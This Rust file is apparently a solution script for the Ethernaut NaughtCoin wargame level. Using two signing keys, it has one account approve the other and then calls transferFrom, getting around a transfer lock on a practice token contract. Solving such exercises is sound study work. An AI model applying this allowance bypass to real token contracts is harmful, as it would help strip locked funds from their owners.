#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Bytes, U256, address, Address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract NaughtCoin {
        function balanceOf(address account) public view returns (uint256);
        function allowance(address owner, address spender) public view returns (uint256);
        function approve(address spender, uint256 value) public returns (bool);
        function transferFrom(address from, address to, uint256 value) public returns (bool);
    }
}

use crate::ethernaut;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level15_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level15())?;

    Ok(())
}

async fn level15() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;
    
    let naughtcoin_address = "0xe9150927369e0eCC9f0088A72A4F6CAD2aa179d8".parse()?;
    let naughtcoin = NaughtCoin::new(
        naughtcoin_address,
        provider.clone()
    );

    println!("[CHECK]");
    let balance = naughtcoin.balanceOf(
        ethernaut::ALICE.parse()?
    ).call().await?;
    let allowance = naughtcoin.allowance(
        ethernaut::ALICE.parse()?,
        ethernaut::BOB.parse()?,
    ).call().await?;
    println!("[NaughtCoin.balanceOf()]    balance = {}", balance);
    println!("[NaughtCoin.allowance()]    allowance = {}\n", allowance);
    
    println!("[EXECUTE]");
    let approve_tx = naughtcoin.approve(
        ethernaut::BOB.parse()?,
        U256::from(1000000000000000000000000u128)
    )
        .send()
        .await?;
    println!("[NaughtCoin.approve()]    Panding transaction... {}",
        approve_tx.tx_hash()
    );

    let approve_receipt = approve_tx.get_receipt().await?;
    println!(
        "[NaughtCoin.approve()]    transaction included in block {}\n",
        approve_receipt.block_number.expect("Failed to get block number")
    );

    println!("[CHECK]");
    let balance = naughtcoin.balanceOf(
        ethernaut::ALICE.parse()?
    ).call().await?;
    let allowance = naughtcoin.allowance(
        ethernaut::ALICE.parse()?,
        ethernaut::BOB.parse()?,
    ).call().await?;
    println!("[NaughtCoin.balanceOf()]    balance = {}", balance);
    println!("[NaughtCoin.allowance()]    allowance = {}\n", allowance);

    println!("[EXECUTE]");
    let transfer_tx = naughtcoin.transferFrom(
        ethernaut::ALICE.parse()?,
        ethernaut::BOB.parse()?,
        U256::from(1000000000000000000000000u128),
    )
        .from(ethernaut::BOB.parse()?)
        .send()
        .await?;
    println!("[NaughtCoin.transferFrom()]    Panding transaction... {}", transfer_tx.tx_hash());

    let transfer_receipt = transfer_tx.get_receipt().await?;
    println!(
        "[NaughtCoin.transferFrom()]    transaction included in block {}",
        transfer_receipt.block_number.expect("Failed to get block number")
    );

    println!("[CHECK]");
    let balance = naughtcoin.balanceOf(
        ethernaut::ALICE.parse()?
    ).call().await?;
    let allowance = naughtcoin.allowance(
        ethernaut::ALICE.parse()?,
        ethernaut::BOB.parse()?,
    ).call().await?;
    println!("[NaughtCoin.balanceOf()]    balance = {}", balance);
    println!("[NaughtCoin.allowance()]    allowance = {}\n", allowance);
    
    Ok(())
}
